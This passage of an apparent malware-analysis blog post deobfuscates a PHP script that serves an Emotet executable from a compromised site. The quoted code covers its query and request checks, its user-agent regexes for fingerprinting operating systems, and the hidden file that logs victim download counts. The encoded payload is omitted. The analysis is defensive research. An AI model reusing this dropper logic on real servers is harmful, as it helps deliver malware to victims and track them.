<p>Additionally, the user can set custom variables using the <em><a href="https://secure.php.net/manual/en/function.ini-set.php">ini_set</a></em> function. The variables <em>max_execution_time</em> and <em>memory_limit</em> are set to an indefinite amount of time and memory.</p>
<p>The <em><a href="https://secure.php.net/manual/en/function.header.php">header</a></em> is set to expire in the past, causing it to be invalidated immediately. Furthermore, any form of caching is disabled. The <em><a href="https://secure.php.net/manual/en/function.opcache-invalidate.php">opcache_invalidate</a></em> function is used to invalidate a cached script, which equals the magic constant <em><a href="https://secure.php.net/manual/en/language.constants.predefined.php">__FILE__</a></em>. This constant refers to the full path and filename of the file from which it is called. The boolean, which equals <em>true</em>, defines if the cache should be cleared forcefully.</p>
<p>The cache is emptied and avoided to never keep a copy of the payload on the server, other than the script itself.</p>
<p>When a user visits the site, several checks are executed. If both checks are passed, a new object is instantiated and a method of this object is invoked. The code is given below.</p>


<div class="wp-geshi-highlight-wrap5"><div class="wp-geshi-highlight-wrap4"><div class="wp-geshi-highlight-wrap3"><div class="wp-geshi-highlight-wrap2"><div class="wp-geshi-highlight-wrap"><div class="wp-geshi-highlight"><div class="php"><pre class="de1"><span class="kw2">class</span> O <span class="br0">&#123;</span>
	<span class="co2">#code omitted
</span><span class="br0">&#125;</span>
&nbsp;
<span class="kw1">if</span> <span class="br0">&#40;</span><span class="re0">$_SERVER</span><span class="br0">&#91;</span><span class="st_h">'QUERY_STRING'</span><span class="br0">&#93;</span><span class="br0">&#41;</span> <span class="br0">&#123;</span>
	<span class="kw3">die</span><span class="br0">&#40;</span><span class="re0">$_SERVER</span><span class="br0">&#91;</span><span class="st_h">'QUERY_STRING'</span><span class="br0">&#93;</span><span class="br0">&#41;</span><span class="sy0">;</span>
<span class="br0">&#125;</span>
&nbsp;
<span class="kw1">if</span> <span class="br0">&#40;</span><span class="re0">$_SERVER</span><span class="br0">&#91;</span><span class="st_h">'REQUEST_METHOD'</span><span class="br0">&#93;</span> <span class="sy0">!=</span> <span class="st_h">'GET'</span><span class="br0">&#41;</span> <span class="br0">&#123;</span>
	<span class="kw3">die</span><span class="br0">&#40;</span><span class="kw3">uniqid</span><span class="br0">&#40;</span><span class="br0">&#41;</span><span class="br0">&#41;</span><span class="sy0">;</span>
<span class="br0">&#125;</span>
&nbsp;
<span class="re0">$sp58859d</span> <span class="sy0">=</span> <span class="kw2">new</span> O<span class="br0">&#40;</span><span class="br0">&#41;</span><span class="sy0">;</span>
<span class="kw1">echo</span> <span class="re0">$sp58859d</span><span class="sy0">-&gt;</span><span class="me1">execute</span><span class="br0">&#40;</span><span class="br0">&#41;</span><span class="sy0">;</span></pre></div></div></div></div></div></div></div>


<p>The variable <em><a href="https://secure.php.net/manual/en/reserved.variables.server.php">$_SERVER</a></em> is used to request information about the server and the way the PHP script is loaded. The variable <em>QUERY_STRING</em> is used to obtain the query string. If any additional parameters are present in the URL, the if-statement returns <em>true</em>.</p>
<p>The function <em><a href="https://secure.php.net/manual/en/function.die.php">die</a></em> is similar to the <em><a href="https://secure.php.net/manual/en/function.exit.php">exit</a></em> function: it displays a message and terminates the script.</p>
<p>Lastly, the function <em><a href="https://secure.php.net/manual/en/function.uniqid.php">uniqid</a></em> is used to generate a unique id. If the request method for the page is not equal to the HTTP <em>GET</em> method, the script is terminated as well.</p>
<p>If both conditions are met, a new object is defined and instantiated: <em>$sp58859d</em>. After that, the <em>execute</em> function is called. The invoked method is part of the class named <em>O</em>, which is given below in parts.</p>


<div class="wp-geshi-highlight-wrap5"><div class="wp-geshi-highlight-wrap4"><div class="wp-geshi-highlight-wrap3"><div class="wp-geshi-highlight-wrap2"><div class="wp-geshi-highlight-wrap"><div class="wp-geshi-highlight"><div class="php"><pre class="de1"><span class="kw2">class</span> O
&nbsp;
<span class="br0">&#123;</span>
	<span class="kw2">private</span> <span class="re0">$content_</span> <span class="sy0">=</span> <span class="st_h">'[omitted due to size]'</span><span class="sy0">;</span>
	<span class="kw2">private</span> <span class="re0">$contentName_</span> <span class="sy0">=</span> <span class="st_h">'iMDbapCVgUb.exe'</span><span class="sy0">;</span>
	<span class="kw2">private</span> <span class="re0">$contentType_</span> <span class="sy0">=</span> <span class="st_h">'application/octet-stream'</span><span class="sy0">;</span></pre></div></div></div></div></div></div></div>


<p>The class has multiple private variables. The <em>$content_</em> is omitted due to its size (292 911 characters), but contains the encoded payload. The <em>$contentName_</em> is the file name and the <em>$contentType_</em> is the type of file that will be returned, in this case an application.</p>
<p>Below, the <em>$regex_</em> variable is given.</p>


<div class="wp-geshi-highlight-wrap5"><div class="wp-geshi-highlight-wrap4"><div class="wp-geshi-highlight-wrap3"><div class="wp-geshi-highlight-wrap2"><div class="wp-geshi-highlight-wrap"><div class="wp-geshi-highlight"><div class="php"><pre class="de1">	<span class="kw2">private</span> <span class="re0">$regex_</span> <span class="sy0">=</span> <span class="kw3">array</span><span class="br0">&#40;</span>
		<span class="kw3">array</span><span class="br0">&#40;</span>
			<span class="st_h">'(?:(?:Orca-)?Android|Adr)[ /](?:[a-z]+ )?(\\d+[\\.\\d]+)'</span><span class="sy0">,</span>
			<span class="st_h">'Android|Silk-Accelerated=[a-z]{4,5}
'</span><span class="sy0">,</span>
			<span class="st_h">'BeyondPod|AntennaPod|Podkicker|DoggCatcher|Player FM|okhttp|Podcatcher Deluxe'</span>
		<span class="br0">&#41;</span> <span class="sy0">,</span>
		<span class="kw3">array</span><span class="br0">&#40;</span>
			<span class="st_h">'CFNetwork/758\\.4\\.3'</span><span class="sy0">,</span>
			<span class="st_h">'CFNetwork/758\\.3\\.15'</span><span class="sy0">,</span>
			<span class="st_h">'CFNetwork/758\\.2\\.[78]'</span><span class="sy0">,</span>
			<span class="st_h">'CFNetwork/758\\.1\\.6'</span><span class="sy0">,</span>
			<span class="st_h">'CFNetwork/758\\.0\\.2'</span><span class="sy0">,</span>
			<span class="st_h">'CFNetwork/711\\.5\\.6'</span><span class="sy0">,</span>
			<span class="st_h">'CFNetwork/711\\.4\\.6'</span><span class="sy0">,</span>
			<span class="st_h">'CFNetwork/711\\.3\\.18'</span><span class="sy0">,</span>
			<span class="st_h">'CFNetwork/711\\.2\\.23'</span><span class="sy0">,</span>
			<span class="st_h">'CFNetwork/711\\.1\\.1[26]'</span><span class="sy0">,</span>
			<span class="st_h">'CFNetwork/711\\.0\\.6'</span><span class="sy0">,</span>
			<span class="st_h">'CFNetwork/672\\.1'</span><span class="sy0">,</span>
			<span class="st_h">'CFNetwork/672\\.0'</span><span class="sy0">,</span>
			<span class="st_h">'CFNetwork/609\\.1'</span><span class="sy0">,</span>
			<span class="st_h">'CFNetwork/60[29]'</span><span class="sy0">,</span>
			<span class="st_h">'CFNetwork/548\\.1'</span><span class="sy0">,</span>
			<span class="st_h">'CFNetwork/548\\.0'</span><span class="sy0">,</span>
			<span class="st_h">'CFNetwork/485\\.13'</span><span class="sy0">,</span>
			<span class="st_h">'CFNetwork/485\\.12'</span><span class="sy0">,</span>
			<span class="st_h">'CFNetwork/485\\.10'</span><span class="sy0">,</span>
			<span class="st_h">'CFNetwork/485\\.2'</span><span class="sy0">,</span>
			<span class="st_h">'CFNetwork/467\\.12'</span><span class="sy0">,</span>
			<span class="st_h">'CFNetwork/459'</span><span class="sy0">,</span>
			<span class="st_h">'(?:CPU OS|iPh(?:one)?[ _]OS|iOS)[ _/](\\d+(?:[_\\.]\\d+)*)'</span><span class="sy0">,</span>
			<span class="st_h">'(?:Apple-)?(?:iPhone|iPad|iPod)(?:.*Mac OS X.*Version/(\\d+\\.\\d+)|;
 Opera)?'</span><span class="sy0">,</span>
			<span class="st_h">'Podcasts/(?:[\\d\\.]+)|Instacast(?:HD)?/(?:\\d\\.[\\d\\.abc]+)|Pocket Casts, iOS|Overcast|Castro|Podcat|i[cC]atcher'</span><span class="sy0">,</span>
			<span class="st_h">'iTunes-(iPod|iPad|iPhone)/(?:[\\d\\.]+)'</span>
		<span class="br0">&#41;</span> <span class="sy0">,</span>
		<span class="kw3">array</span><span class="br0">&#40;</span>
			<span class="st_h">'Maemo'</span><span class="sy0">,</span>
			<span class="st_h">'Arch ?Linux(?:[ /\\-](\\d+[\\.\\d]+))?'</span><span class="sy0">,</span>
			<span class="st_h">'VectorLinux(?: package)?(?:[ /\\-](\\d+[\\.\\d]+))?'</span><span class="sy0">,</span>
			<span class="st_h">'Linux;
 .*((?:Debian|Knoppix|Mint|Ubuntu|Kubuntu|Xubuntu|Lubuntu|Fedora|Red Hat|Mandriva|Gentoo|Sabayon|Slackware|SUSE|CentOS|BackTrack))[ /](\\d+[\\.\\d]+)'</span><span class="sy0">,</span>
			<span class="st_h">'(Debian|Knoppix|Mint|Ubuntu|Kubuntu|Xubuntu|Lubuntu|Fedora|Red Hat|Mandriva|Gentoo|Sabayon|Slackware|SUSE|CentOS|BackTrack)(?:(?: Enterprise)? Linux)?(?:[ /\\-](\\d+[\\.\\d]+))?'</span><span class="sy0">,</span>
			<span class="st_h">'Linux(?:OS)?[^a-z]'</span>
		<span class="br0">&#41;</span> <span class="sy0">,</span>
		<span class="kw3">array</span><span class="br0">&#40;</span>
			<span class="st_h">'CFNetwork/760'</span><span class="sy0">,</span>
			<span class="st_h">'CFNetwork/720'</span><span class="sy0">,</span>
			<span class="st_h">'CFNetwork/673'</span><span class="sy0">,</span>
			<span class="st_h">'CFNetwork/596'</span><span class="sy0">,</span>
			<span class="st_h">'CFNetwork/520'</span><span class="sy0">,</span>
			<span class="st_h">'CFNetwork/454'</span><span class="sy0">,</span>
			<span class="st_h">'CFNetwork/(?:438|422|339|330|221|220|217)'</span><span class="sy0">,</span>
			<span class="st_h">'CFNetwork/12[89]'</span><span class="sy0">,</span>
			<span class="st_h">'CFNetwork/1\\.2'</span><span class="sy0">,</span>
			<span class="st_h">'CFNetwork/1\\.1'</span><span class="sy0">,</span>
			<span class="st_h">'Mac OS X(?: (?:Version )?(\\d+(?:[_\\.]\\d+)+))?'</span><span class="sy0">,</span>
			<span class="st_h">'Mac (\\d+(?:[_\\.]\\d+)+)'</span><span class="sy0">,</span>
			<span class="st_h">'Darwin|Macintosh|Mac_PowerPC|PPC|Mac PowerPC|iMac|MacBook'</span>
		<span class="br0">&#41;</span> <span class="sy0">,</span>
		<span class="kw3">array</span><span class="br0">&#40;</span>
			<span class="st_h">'CYGWIN_NT-10.0|Windows NT 10.0|Windows 10'</span><span class="sy0">,</span>
			<span class="st_h">'CYGWIN_NT-6.4|Windows NT 6.4|Windows 10'</span><span class="sy0">,</span>
			<span class="st_h">'CYGWIN_NT-6.3|Windows NT 6.3|Windows 8.1'</span><span class="sy0">,</span>
			<span class="st_h">'CYGWIN_NT-6.2|Windows NT 6.2|Windows 8'</span><span class="sy0">,</span>
			<span class="st_h">'CYGWIN_NT-6.1|Windows NT 6.1|Windows 7'</span><span class="sy0">,</span>
			<span class="st_h">'CYGWIN_NT-6.0|Windows NT 6.0|Windows Vista'</span><span class="sy0">,</span>
			<span class="st_h">'CYGWIN_NT-5.2|Windows NT 5.2|Windows Server 2003 / XP x64'</span><span class="sy0">,</span>
			<span class="st_h">'CYGWIN_NT-5.1|Windows NT 5.1|Windows XP'</span>
		<span class="br0">&#41;</span> <span class="sy0">,</span>
		<span class="kw3">array</span><span class="br0">&#40;</span>
			<span class="st_h">'.?'</span>
		<span class="br0">&#41;</span>
	<span class="br0">&#41;</span><span class="sy0">;</span></pre></div></div></div></div></div></div></div>


<p>The array consists of arrays, each of which defines a different operating system group. At index zero, Android names are matched. The first index contains information about iPhones, iPads and iPods. The second index contains information about Linux distributions. The third index contains information about MacOS systems. The fourth index contains different versions of the Windows operating system. At last, a regex for any character except newlines is used. This match serves as the <em>other</em> category.</p>
<p>Below the function that uses the <em>$regex_</em> variable is given.</p>


<div class="wp-geshi-highlight-wrap5"><div class="wp-geshi-highlight-wrap4"><div class="wp-geshi-highlight-wrap3"><div class="wp-geshi-highlight-wrap2"><div class="wp-geshi-highlight-wrap"><div class="wp-geshi-highlight"><div class="php"><pre class="de1">	<span class="kw2">private</span>	<span class="kw2">function</span> spabbd98<span class="br0">&#40;</span><span class="re0">$sp1bd672</span><span class="br0">&#41;</span>
	<span class="br0">&#123;</span>
		<span class="kw1">foreach</span><span class="br0">&#40;</span><span class="re0">$this</span><span class="sy0">-&gt;</span><span class="me1">regex_</span> <span class="kw1">as</span> <span class="re0">$spda961f</span> <span class="sy0">=&gt;</span> <span class="re0">$spd59ff0</span><span class="br0">&#41;</span> <span class="br0">&#123;</span>
			<span class="kw1">foreach</span><span class="br0">&#40;</span><span class="re0">$spd59ff0</span> <span class="kw1">as</span> <span class="re0">$sp439cf2</span><span class="br0">&#41;</span> <span class="br0">&#123;</span>
				<span class="re0">$sp439cf2</span> <span class="sy0">=</span> <span class="st_h">'/(?:^|[^A-Z_-])(?:'</span> <span class="sy0">.</span> <span class="kw3">str_replace</span><span class="br0">&#40;</span><span class="st_h">'/'</span><span class="sy0">,</span> <span class="st_h">'\\/'</span><span class="sy0">,</span> <span class="re0">$sp439cf2</span><span class="br0">&#41;</span> <span class="sy0">.</span> <span class="st_h">')/i'</span><span class="sy0">;</span>
				<span class="kw1">if</span> <span class="br0">&#40;</span><span class="kw3">preg_match</span><span class="br0">&#40;</span><span class="re0">$sp439cf2</span><span class="sy0">,</span> <span class="re0">$sp1bd672</span><span class="br0">&#41;</span><span class="br0">&#41;</span> <span class="br0">&#123;</span>
					<span class="kw1">return</span> <span class="re0">$spda961f</span><span class="sy0">;</span>
				<span class="br0">&#125;</span>
			<span class="br0">&#125;</span>
		<span class="br0">&#125;</span>
&nbsp;
		<span class="kw1">return</span> <span class="sy0">-</span><span class="nu0">1</span><span class="sy0">;</span>
	<span class="br0">&#125;</span></pre></div></div></div></div></div></div></div>


<p>The variable <em>$spd59ff0</em> can be renamed to <em>$forEachValue</em> since it equals the current value of the array that is being looped through. As such, the variable <em>$sp439cf2</em> can be renamed to <em>$nestedArray</em>.</p>
<p>The function <em><a href="https://secure.php.net/manual/en/function.preg-match.php">preg_match</a></em> performs a regular expression (the first argument) on a string (the second argument). The variable <em>$sp1bd672</em> can thus be refactored to <em>$regexSubject</em>. At last, the variable <em>$spda961f</em> is returned. This variable equals the operating system that was matched. As such, it can be renamed to <em>$operatingSystem</em>.</p>
<p>If no match is found, the value minus one is returned. This can happen when the given argument is either <em>null</em> or consists only of newline characters. The refactored code is given below.</p>


<div class="wp-geshi-highlight-wrap5"><div class="wp-geshi-highlight-wrap4"><div class="wp-geshi-highlight-wrap3"><div class="wp-geshi-highlight-wrap2"><div class="wp-geshi-highlight-wrap"><div class="wp-geshi-highlight"><div class="php"><pre class="de1">	<span class="kw2">private</span> <span class="kw2">function</span> getOperatingSystem<span class="br0">&#40;</span><span class="re0">$regexSubject</span><span class="br0">&#41;</span>
	<span class="br0">&#123;</span>
		<span class="kw1">foreach</span><span class="br0">&#40;</span><span class="re0">$this</span><span class="sy0">-&gt;</span><span class="me1">regex_</span> <span class="kw1">as</span> <span class="re0">$operatingSystem</span> <span class="sy0">=&gt;</span> <span class="re0">$forEachValue</span><span class="br0">&#41;</span> <span class="br0">&#123;</span>
			<span class="kw1">foreach</span><span class="br0">&#40;</span><span class="re0">$forEachValue</span> <span class="kw1">as</span> <span class="re0">$nestedArray</span><span class="br0">&#41;</span> <span class="br0">&#123;</span>
				<span class="re0">$nestedArray</span> <span class="sy0">=</span> <span class="st_h">'/(?:^|[^A-Z_-])(?:'</span> <span class="sy0">.</span> <span class="kw3">str_replace</span><span class="br0">&#40;</span><span class="st_h">'/'</span><span class="sy0">,</span> <span class="st_h">'\\/'</span><span class="sy0">,</span> <span class="re0">$nestedArray</span><span class="br0">&#41;</span> <span class="sy0">.</span> <span class="st_h">')/i'</span><span class="sy0">;</span>
				<span class="kw1">if</span> <span class="br0">&#40;</span><span class="kw3">preg_match</span><span class="br0">&#40;</span><span class="re0">$nestedArray</span><span class="sy0">,</span> <span class="re0">$regexSubject</span><span class="br0">&#41;</span><span class="br0">&#41;</span> <span class="br0">&#123;</span>
					<span class="kw1">return</span> <span class="re0">$operatingSystem</span><span class="sy0">;</span>
				<span class="br0">&#125;</span>
			<span class="br0">&#125;</span>
		<span class="br0">&#125;</span>
		<span class="kw1">return</span> <span class="sy0">-</span><span class="nu0">1</span><span class="sy0">;</span>
	<span class="br0">&#125;</span></pre></div></div></div></div></div></div></div>


<p>The <em>execute</em> function is given below in parts.</p>


<div class="wp-geshi-highlight-wrap5"><div class="wp-geshi-highlight-wrap4"><div class="wp-geshi-highlight-wrap3"><div class="wp-geshi-highlight-wrap2"><div class="wp-geshi-highlight-wrap"><div class="wp-geshi-highlight"><div class="php"><pre class="de1"><span class="kw2">public</span> <span class="kw2">function</span> execute<span class="br0">&#40;</span><span class="br0">&#41;</span> <span class="br0">&#123;</span>
	<span class="re0">$sp1cb870</span> <span class="sy0">=</span> <span class="st_h">'.'</span> <span class="sy0">.</span> <span class="kw3">sha1</span><span class="br0">&#40;</span><span class="kw3">basename</span><span class="br0">&#40;</span><span class="kw3">dirname</span><span class="br0">&#40;</span><span class="kw4">__FILE__</span><span class="br0">&#41;</span><span class="br0">&#41;</span><span class="br0">&#41;</span><span class="sy0">;</span></pre></div></div></div></div></div></div></div>


<p>The variable <em>$sp1cb870</em> is equal to the <a href="https://secure.php.net/manual/en/function.sha1.php">SHA-1 hash</a> of the <em><a href="https://secure.php.net/manual/en/function.basename.php">basename</a></em> of the <em><a href="https://secure.php.net/manual/en/function.dirname.php">dirname</a></em> of the magic constant <em><a href="https://secure.php.net/manual/en/language.constants.predefined.php">__FILE__</a></em>. The <em>basename</em> returns the trailing name of the component. The <em>dirname</em> returns the parent directory of the provided argument (the magic constant <em>__FILE__</em>, which equals the script itself). Note that the file name starts with a dot, making it a hidden file on Unix-like systems.</p>
<p>A proof-of-concept of this line is given below. The name of the folder in which the script resided, was <em>emotet</em>.</p>


<div class="wp-geshi-highlight-wrap5"><div class="wp-geshi-highlight-wrap4"><div class="wp-geshi-highlight-wrap3"><div class="wp-geshi-highlight-wrap2"><div class="wp-geshi-highlight-wrap"><div class="wp-geshi-highlight"><div class="php"><pre class="de1"><span class="kw2">&lt;?php</span> <span class="kw1">echo</span> <span class="kw3">sha1</span><span class="br0">&#40;</span><span class="kw3">basename</span><span class="br0">&#40;</span><span class="kw3">dirname</span><span class="br0">&#40;</span><span class="kw4">__FILE__</span><span class="br0">&#41;</span><span class="br0">&#41;</span><span class="br0">&#41;</span> <span class="sy0">.</span> <span class="st0">&quot;<span class="es1">\n</span>&quot;</span><span class="sy0">;</span></pre></div></div></div></div></div></div></div>


<p>The output of this script equals <em>8def78060ee806dcf94e65eb9b2fdf4ca1adb2de</em>, which is the SHA-1 hash of <em>emotet</em>. The variable can be renamed to <em>$sha1Hash</em>.</p>
<p>Below, the next couple of lines are given.</p>


<div class="wp-geshi-highlight-wrap5"><div class="wp-geshi-highlight-wrap4"><div class="wp-geshi-highlight-wrap3"><div class="wp-geshi-highlight-wrap2"><div class="wp-geshi-highlight-wrap"><div class="wp-geshi-highlight"><div class="php"><pre class="de1">		<span class="kw3">touch</span><span class="br0">&#40;</span><span class="re0">$sha1Hash</span><span class="br0">&#41;</span><span class="sy0">;</span>
		<span class="re0">$spdfc158</span> <span class="sy0">=</span> <span class="kw3">fopen</span><span class="br0">&#40;</span><span class="re0">$sha1Hash</span><span class="sy0">,</span> <span class="st_h">'r+'</span><span class="br0">&#41;</span><span class="sy0">;</span></pre></div></div></div></div></div></div></div>


<p>The <em><a href="https://secure.php.net/manual/en/function.touch.php">touch</a></em> function is used to set the time of a file. If the file does not exist, it is created.</p>
<p>The newly created file is then opened using <em><a href="https://secure.php.net/manual/en/function.fopen.php">fopen</a></em>. The parameter <em>r+</em> opens the file as readable and writable with the file pointer set at the beginning of the file. As such, the variable <em>$spdfc158</em> can be renamed to <em>$sha1HashFile</em>.</p>
<p>The next two if-statements are given below.</p>


<div class="wp-geshi-highlight-wrap5"><div class="wp-geshi-highlight-wrap4"><div class="wp-geshi-highlight-wrap3"><div class="wp-geshi-highlight-wrap2"><div class="wp-geshi-highlight-wrap"><div class="wp-geshi-highlight"><div class="php"><pre class="de1"><span class="kw1">if</span> <span class="br0">&#40;</span><span class="re0">$sha1HashFile</span> <span class="sy0">!==</span> <span class="kw4">false</span><span class="br0">&#41;</span> <span class="br0">&#123;</span>
			<span class="kw1">if</span> <span class="br0">&#40;</span><span class="kw3">flock</span><span class="br0">&#40;</span><span class="re0">$sha1HashFile</span><span class="sy0">,</span> LOCK_EX<span class="br0">&#41;</span><span class="br0">&#41;</span> <span class="br0">&#123;</span>
				<span class="re0">$sp7c7c2a</span> <span class="sy0">=</span> <span class="kw3">array</span><span class="br0">&#40;</span><span class="br0">&#41;</span><span class="sy0">;</span>
				<span class="re0">$spe8c644</span> <span class="sy0">=</span> <span class="kw3">filesize</span><span class="br0">&#40;</span><span class="re0">$sha1Hash</span><span class="br0">&#41;</span><span class="sy0">;</span>
				<span class="kw1">if</span> <span class="br0">&#40;</span><span class="re0">$spe8c644</span> <span class="sy0">&gt;</span> <span class="nu0">0</span><span class="br0">&#41;</span> <span class="br0">&#123;</span>
					<span class="re0">$sp7c7c2a</span> <span class="sy0">=</span> <span class="kw3">json_decode</span><span class="br0">&#40;</span><span class="kw3">fread</span><span class="br0">&#40;</span><span class="re0">$sha1HashFile</span><span class="sy0">,</span> <span class="re0">$spe8c644</span><span class="br0">&#41;</span> <span class="sy0">,</span> <span class="kw4">true</span><span class="br0">&#41;</span><span class="sy0">;</span>
				<span class="br0">&#125;</span>
<span class="br0">&#91;</span><span class="sy0">...</span><span class="br0">&#93;</span></pre></div></div></div></div></div></div></div>


<p>The if-statement compares if the <em>$sha1HashFile</em> is <em>true</em> (not identical to <em>false</em>). If this is the case, the function <em><a href="https://secure.php.net/manual/en/function.flock.php">flock</a></em> is called with <em>$sha1HashFile</em> and <em>LOCK_EX</em> as arguments. This sets an exclusive lock on the file, meaning it cannot be modified by anything else until the file is unlocked.</p>
<p>The variable <em>$spe8c644</em> is equal to the <a href="https://secure.php.net/manual/en/function.filesize.php">filesize</a> of the <em>$sha1Hash</em> file. As such, it can be renamed to <em>$sha1HashFileSize</em>.</p>
<p>The <em><a href="https://secure.php.net/manual/en/function.json-decode.php">json_decode</a></em> function is used together with <em><a href="https://secure.php.net/manual/en/function.fread.php">fread</a></em>. The <em>json_decode</em> function is used to decode JSON. The second argument (<em>true</em>) is used to ensure that the return value is saved in the array type. The <em>fread</em> function requires the file and the length that should be read. It is a binary-safe file read. The decoded result is saved in the previously instantiated array <em>$sp7c7c2a</em>, which can be renamed into <em>$decodedSha1File</em>.</p>
<p>The next part of the function is given below.</p>


<div class="wp-geshi-highlight-wrap5"><div class="wp-geshi-highlight-wrap4"><div class="wp-geshi-highlight-wrap3"><div class="wp-geshi-highlight-wrap2"><div class="wp-geshi-highlight-wrap"><div class="wp-geshi-highlight"><div class="php"><pre class="de1"><span class="re0">$sp6345e2</span> <span class="sy0">=</span> <span class="kw3">isset</span><span class="br0">&#40;</span><span class="re0">$_SERVER</span><span class="br0">&#91;</span><span class="st_h">'HTTP_USER_AGENT'</span><span class="br0">&#93;</span><span class="br0">&#41;</span> ? <span class="re0">$_SERVER</span><span class="br0">&#91;</span><span class="st_h">'HTTP_USER_AGENT'</span><span class="br0">&#93;</span> <span class="sy0">:</span> <span class="st_h">''</span><span class="sy0">;</span>
<span class="re0">$spda961f</span> <span class="sy0">=</span> <span class="re0">$this</span><span class="sy0">-&gt;</span><span class="me1">getOperatingSystem</span><span class="br0">&#40;</span><span class="re0">$sp6345e2</span><span class="br0">&#41;</span><span class="sy0">;</span>
<span class="kw1">if</span> <span class="br0">&#40;</span><span class="re0">$spda961f</span> <span class="sy0">&gt;</span> <span class="nu0">0</span><span class="br0">&#41;</span> <span class="br0">&#123;</span>
	<span class="kw1">if</span> <span class="br0">&#40;</span><span class="sy0">!</span><span class="kw3">isset</span><span class="br0">&#40;</span><span class="re0">$decodedSha1File</span><span class="br0">&#91;</span><span class="re0">$spda961f</span><span class="br0">&#93;</span><span class="br0">&#41;</span> <span class="sy0">||</span> <span class="sy0">!</span><span class="kw3">is_int</span><span class="br0">&#40;</span><span class="re0">$decodedSha1File</span><span class="br0">&#91;</span><span class="re0">$spda961f</span><span class="br0">&#93;</span><span class="br0">&#41;</span><span class="br0">&#41;</span> <span class="br0">&#123;</span>
		<span class="re0">$decodedSha1File</span><span class="br0">&#91;</span><span class="re0">$spda961f</span><span class="br0">&#93;</span> <span class="sy0">=</span> <span class="nu0">0</span><span class="sy0">;</span>
	<span class="br0">&#125;</span>
&nbsp;
	<span class="re0">$decodedSha1File</span><span class="br0">&#91;</span><span class="re0">$spda961f</span><span class="br0">&#93;</span><span class="sy0">++;</span>
<span class="br0">&#125;</span></pre></div></div></div></div></div></div></div>


<p>Using the <em><a href="https://secure.php.net/manual/en/function.isset.php">isset</a></em> function, the <em>HTTP_USER_AGENT</em> is obtained. If it is not available, the returned value is an empty string. Hence, the variable <em>$sp6345e2</em> can be renamed to <em>$userAgent</em>.</p>
<p>The variable <em>$spda961f</em> contains the return value of the <em>getOperatingSystem</em> function. A suitable name for this variable is <em>$operatingSystem</em>.</p>
<p>If the operating system (which is represented as a number based of the index in the <em>$regex_</em> variable) within the JSON file does not exist or isn&#8217;t an integer, the value is set to zero. The value of the operating system within the JSON file is then incremented with one. An example of the content of the JSON is file is given below.</p>
<pre>
{"5":18}
</pre>
<p>The key equals <em>5</em> whilst the value equals <em>18</em>. The operating system type that corresponds with the key is the fifth one in the <em>$regex_</em>: any character but a newline. The <em>$sha1HashFile</em> is used to keep track of the amount of downloads and the operating system which requested the download. </p>
<p>The file lock is used to make sure that all requests are logged, as a race condition is mitigated due to the lock. The maximum execution time is set to an unlimited amount of time, meaning sometimes the macro which requests the payload, has to wait a bit before the file is served. </p>
<p>Additionally, it provides statistics for the criminal actor through which both the usage and the operating systems of the victims can be seen. Weird statistics might cause the actor to take the site offline to mitigate the efforts of malware analysts.</p>
<p>The file handling part of the function is given below.</p>


<div class="wp-geshi-highlight-wrap5"><div class="wp-geshi-highlight-wrap4"><div class="wp-geshi-highlight-wrap3"><div class="wp-geshi-highlight-wrap2"><div class="wp-geshi-highlight-wrap"><div class="wp-geshi-highlight"><div class="php"><pre class="de1">		<span class="kw3">fseek</span><span class="br0">&#40;</span><span class="re0">$sha1HashFile</span><span class="sy0">,</span> <span class="nu0">0</span><span class="br0">&#41;</span><span class="sy0">;</span>
		<span class="kw3">fwrite</span><span class="br0">&#40;</span><span class="re0">$sha1HashFile</span><span class="sy0">,</span> <span class="kw3">json_encode</span><span class="br0">&#40;</span><span class="re0">$decodedSha1File</span><span class="br0">&#41;</span><span class="br0">&#41;</span><span class="sy0">;</span>
		<span class="kw3">fflush</span><span class="br0">&#40;</span><span class="re0">$sha1HashFile</span><span class="br0">&#41;</span><span class="sy0">;</span>
		<span class="kw3">flock</span><span class="br0">&#40;</span><span class="re0">$sha1HashFile</span><span class="sy0">,</span> LOCK_UN<span class="br0">&#41;</span><span class="sy0">;</span>
	<span class="br0">&#125;</span>
	<span class="kw3">fclose</span><span class="br0">&#40;</span><span class="re0">$sha1HashFile</span><span class="br0">&#41;</span><span class="sy0">;</span>
<span class="br0">&#125;</span></pre></div></div></div></div></div></div></div>


<p>The file pointer is set to index 0 with <em><a href="https://secure.php.net/manual/en/function.fseek.php">fseek</a></em>, after which <em><a href="https://secure.php.net/manual/en/function.fwrite.php">fwrite</a></em> is called to write the string to the file. The function <em><a href="https://secure.php.net/manual/en/function.fflush.php">fflush</a></em> flushes the output to a file. Lastly, the file is unlocked using <em><a href="https://secure.php.net/manual/en/function.flock.php">flock</a></em> (note the <em>LOCK_UN</em> argument to unlock the file). The file handle is then closed using <em><a href="https://secure.php.net/manual/en/function.fclose.php">fclose</a></em>.</p>
<p>The <em>$sha1HashFile</em> is used to keep track of statistics. Below, the code is rewritten in pseudo code for a better understanding.</p>


<div class="wp-geshi-highlight-wrap5"><div class="wp-geshi-highlight-wrap4"><div class="wp-geshi-highlight-wrap3"><div class="wp-geshi-highlight-wrap2"><div class="wp-geshi-highlight-wrap"><div class="wp-geshi-highlight"><div class="c"><pre class="de1">statistics <span class="sy0">=</span> openFile<span class="br0">&#40;</span>sha1hash<span class="br0">&#40;</span>currentDirectory<span class="br0">&#40;</span><span class="br0">&#41;</span><span class="br0">&#41;</span><span class="sy0">,</span> EXCLUSIVE_LOCK<span class="br0">&#41;</span><span class="sy0">;</span>
operatingSystem <span class="sy0">=</span> getOperatingSystem<span class="br0">&#40;</span>userAgent<span class="br0">&#41;</span><span class="sy0">;</span>
<span class="kw1">if</span><span class="br0">&#40;</span><span class="sy0">!</span>statistics.<span class="me1">contains</span><span class="br0">&#40;</span>operatingSystem<span class="br0">&#41;</span><span class="br0">&#41;</span> <span class="br0">&#123;</span>
    statistics.<span class="me1">add</span><span class="br0">&#40;</span>operatingSystem<span class="sy0">,</span> <span class="nu0">0</span><span class="br0">&#41;</span><span class="sy0">;</span>
<span class="br0">&#125;</span>
statistics.<span class="me1">increment</span><span class="br0">&#40;</span>operatingSystem<span class="br0">&#41;</span><span class="sy0">;</span>
statistics.<span class="me1">writeToFile</span><span class="br0">&#40;</span><span class="br0">&#41;</span><span class="sy0">;</span>
closeFile<span class="br0">&#40;</span>statistics<span class="sy0">,</span> UNLOCK<span class="br0">&#41;</span><span class="sy0">;</span></pre></div></div></div></div></div></div></div>


<p>The return value of the function is given below.</p>


